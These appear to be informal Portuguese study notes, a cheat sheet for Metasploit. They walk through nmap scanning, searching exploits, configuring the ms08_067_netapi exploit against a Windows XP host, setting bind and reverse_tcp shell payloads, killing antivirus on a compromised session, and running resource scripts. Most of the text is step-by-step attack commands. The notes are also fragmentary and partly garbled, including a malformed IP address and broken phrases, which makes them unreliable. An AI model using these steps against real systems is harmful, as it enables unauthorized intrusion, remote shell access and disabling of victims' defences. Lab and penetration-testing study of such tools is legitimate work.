msfconsole     no shell
msfupdate -- atualização
msfdb init ---- crea inicialização post
verificar status --- service postgresql status  .. caso esteja dead
usar o service postgresql start
nmap -A -oX resultados.xml 192 268 13-16

? --- ver os comandos
pwd -- olha a onda esta localizado a pasta

db_import resultados.xml
hosts -- mostra o parametro das maquinas encontradas .. pelo import xml 

services .... todos os serviços que descobrio no -A ... ele informa

caso não use o nmap ..... db_nmap -A 192.168.1.1
msfupdate --- atualizações ...

pesquisar coisas especificas ... search -h
search cve:2015 type:exploit app:client

search Internet Explorer
search ms15
search fileformat
search netapi -- serve

agora para usar o que vc achou

use exploit/windows/smb/ms08_067_netapi ... digite o cmainho todo que achou 

show options --- o que precisa configurar para rodar
set RHOST 192.168.1.16 xp
setg Lhost 192.168.1.107

search windows/shell
set payload windows/shell/tcp_bind

show missing -- pra ver se esquecir de algo
agora que configurou tudo .. rode o comando "exploit"
agora vc tá no cmd do windows
pode usar reverse_tcp

sessions -h ... comando pra ver as sessoes

quando pegar a sessão .. deh o comando sessions -u 2

sessions -s killav -i 2 .. matando anti virus

para ver o scripts search post/windows

comando para baixar kkkk coisas dowload calc.exe

vc pode criar uma arquivo ac

se tiver dentro do msf .. digitar msf > resource script.rc
msfconsole -r script.rc

windows/meterpreter/reverse_tcp

show targets
set target 

